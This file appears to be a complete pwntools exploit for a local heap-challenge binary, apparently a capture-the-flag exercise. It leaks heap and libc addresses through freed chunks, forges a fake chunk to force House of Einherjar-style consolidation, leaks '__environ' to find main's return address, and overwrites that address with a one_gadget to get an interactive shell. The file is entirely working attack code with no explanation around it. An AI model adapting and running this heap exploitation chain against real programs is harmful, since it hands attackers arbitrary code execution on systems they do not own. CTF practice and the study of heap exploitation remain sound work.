from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./data/sample22')
p = process('./data/sample22')
libc = elf.libc
log.info('PID: ' + str(proc.pidof(p)[0]))
main_arena_offset = 0x3c4b20

def add(size, content):
    p.recvuntil(b'(CMD)>>> ')
    p.sendline(b'a')
    p.recvuntil(b'(SIZE)>>> ')
    p.sendline(str(size).encode())
    p.recvuntil(b'(CONTENT)>>> ')
    p.sendline(content)


def edit(idx, content):
    p.recvuntil(b'(CMD)>>> ')
    p.sendline(b'e')
    p.recvuntil(b'(INDEX)>>> ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'(CONTENT)>>> ')
    p.sendline(content)
    p.recvuntil(b'Is it OK?\n')
    p.sendline(b'Y')


def delete(idx):
    p.recvuntil(b'(CMD)>>> ')
    p.sendline(b'd')
    p.recvuntil(b'(INDEX)>>> ')
    p.sendline(str(idx).encode())

def edit_ffff(n, diff):
    for i in range(n + 1):
        data = diff.rjust(0x18 - i, b'f')
        edit(1, data)

p.recvuntil(b'  ============================================================================\n\n');add(0x70, b'a' * 8);add(0x70, b'b' * 8);add(0x100, b'c' * 8);delete(2);delete(1)#step.1

p.recvuntil(b' # CONTENT: ');data = p.recvuntil(b'\n', drop=True);heap_base = u64(data.ljust(8, b'\x00')) - 0x80#step.2

delete(3)#step.3

p.recvuntil(b' # CONTENT: ');data = p.recvuntil(b'\n', drop=True);main_arena = u64(data.ljust(8, b'\x00')) - 88;libc.address = main_arena - main_arena_offset#step.4

add(0x18, b'a' * 0x18);add(0x100, b'b' * 0xf8 + b'\x11');add(0x100, b'c' * 0xf8);add(0x100, b'd' * 0xf8)#step.5

fakechunk_addr = 0x602040 + 0x20
fakechunk_size = 0x101
fakechunk = p64(0) + p64(fakechunk_size) + p64(fakechunk_addr) + p64(fakechunk_addr)
edit(3, b'd'* 0x20 + fakechunk)#step.6

diff = heap_base + 0x20 - fakechunk_addr
diff_strip = p64(diff).strip(b'\0')
number_of_zeros = len(p64(diff)) - len(diff_strip)

edit_ffff(number_of_zeros, diff_strip)#step.7

delete(2);p.recvuntil(b'\nDeleted.')#step.8

edit(4, b'd' * 0x20 + p64(0) + p64(0x101) + p64(main_arena + 88) + p64(main_arena + 88))#step.9

one_gadget_addr = libc.address + 0x45226;environ_pointer = libc.symbols['__environ'];fake_pad = b'f' * (0x100 - 0x20 - 0x10) + b'a' * 8 + p64(environ_pointer) + b'a' * 8 + p64(0x602148);add(0x100 - 8, fake_pad)#step.10

p.recvuntil(b' # CONTENT: ');environ_addr = p.recvuntil(b'\n', drop=True).ljust(8, b'\x00');environ_addr = u64(environ_addr)#step.11

main_ret_addr = environ_addr - 30 * 8;edit(2, p64(main_ret_addr));edit(1, p64(one_gadget_addr))#step.12

p.recvuntil(b'(CMD)>>> ');p.sendline(b'Q');p.interactive()